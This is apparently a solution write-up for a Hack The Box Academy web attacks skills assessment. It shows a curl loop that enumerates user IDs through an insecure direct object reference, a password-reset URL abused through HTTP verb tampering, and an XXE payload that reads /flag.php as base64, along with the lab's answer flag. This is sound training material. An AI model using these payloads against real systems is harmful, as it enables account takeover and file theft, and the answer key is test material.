```
_____________ ________________           _______                                                        _____ 
__  ___/__  /____(_)__  /__  /_______    ___    |_______________________________________ _________________  /_
_____ \__  //_/_  /__  /__  /__  ___/    __  /| |_  ___/_  ___/  _ \_  ___/_  ___/_  __ `__ \  _ \_  __ \  __/
____/ /_  ,<  _  / _  / _  / _(__  )     _  ___ |(__  )_(__  )/  __/(__  )_(__  )_  / / / / /  __/  / / / /_  
/____/ /_/|_| /_/  /_/  /_/  /____/      /_/  |_/____/ /____/ \___//____/ /____/ /_/ /_/ /_/\___//_/ /_/\__/  
```
You are performing a web application penetration test for a software development company,
and they task you with testing the latest build of their social networking web
application. Try to utilize the various techniques you learned in this module to
identify and exploit multiple vulnerabilities found in the web application. [^1]

Web Attacks: Skills Assessment: Solution
-----------------------------------------------------------------------------------------
After logging in to the web application with the given credentials, we are prompted with
a dashboard and are assigned the `uid: 74` with a PHP session ID cookie. Now, we want to
find out the username, user ID and token for the administrator. For that, we discover the
*Insecure Direct Object References* (IDOR) vulnerability under `api.php/user/<UID>`.

```bash
for i in {1..100}; do curl http://<IP_ADDRESS>:<PORT>/api.php/user/$i; done
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

This way, we have discovered the user ID for the admin and now we can obtain the token
with a GET request to `http://<IP_ADDRESS>:<PORT>/api.php/token/52` to get the token
"e51a85fa-17ac-11ec-8e51-e78234eb7b0c" for the uid "52".

The next step exploits a HTTP verb tampering vulnerability in the reset function with
the obtained token as follows:<br>
`/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=newpass`<br>
This, way we are rewarded with a successful password change. Now, we can log in with the
username "a.corrales" and the password "newpass".
With the admin functionality, we can now add events to the calendar and when we
do this with a dummy request to addEvent.php we can see that the request payload
is XML code. And in the response, the name of the even is printed, so we can
craft the following malicious payload to show the flag contents in base64.

```xml
<!DOCTYPE root [
  <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
 <name>&test;</name>
 <details>test</details>
 <date>2022-28-04</date>
</root>
```

With this request, we get the contents of the file encrypted in base64 which can be
decoded easily with `base64 -d`:

> Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.

[^1]: https://academy.hackthebox.com/module/134
